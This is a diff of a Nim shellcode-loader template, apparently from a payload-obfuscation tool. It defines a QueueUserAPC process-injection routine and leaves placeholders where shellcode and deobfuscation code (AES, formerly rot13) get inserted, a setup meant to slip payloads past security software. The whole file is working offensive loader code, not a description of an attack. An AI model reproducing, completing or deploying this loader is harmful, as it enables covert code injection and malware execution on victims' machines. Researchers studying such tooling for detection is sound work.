@@ -3,9 +3,13 @@
 # in a python script and change them with fstrings)
 
 import winim
-import std/base64
+import std/base64   # Base64
 import std/strutils
 import std/sequtils
+import nimAES, unittest       # AES-CBC
+
+# Adding the below line so obfuscators can inject their codes; comment because it never gets deleted and we want the compiler to ignore it.
+# DEOBFUSCATION_FUNCTION_INJECTED_HERE
 
 proc injectQueueUserAPC[I, T](shellcode: array[I, T]): void =
 
@@ -79,22 +83,11 @@ proc injectQueueUserAPC[I, T](shellcode: array[I, T]): void =
     CloseHandle(tHandle)
     CloseHandle(pHandle)
 
-# NOTE: Not happy with this declaration here, this should be added if the user wants rot13
-proc rot13decode(stringToEncode: string): string =
-    for c in stringToEncode:
-        case toUpperAscii(c)
-            of 'N'..'Z':
-                result = result & chr(ord(c) - 13)
-            of 'A'..'M':
-                result = result & chr(ord(c) + 13)
-            else:
-                result = result & c
-
 var sc: string = "SHELLCODE_INJECTED_HERE"
 var sc_seq: seq[byte]
 
 
-# Adding the below line so encoders can inject their codes; comment because it never gets deleted and we want the compiler to ignore it.
+# Adding the below line so obfuscators can inject their codes; comment because it never gets deleted and we want the compiler to ignore it.
 # DEOBFUSCATION_CODE_INJECTED_HERE
 
 sc_seq = sc.split(',')
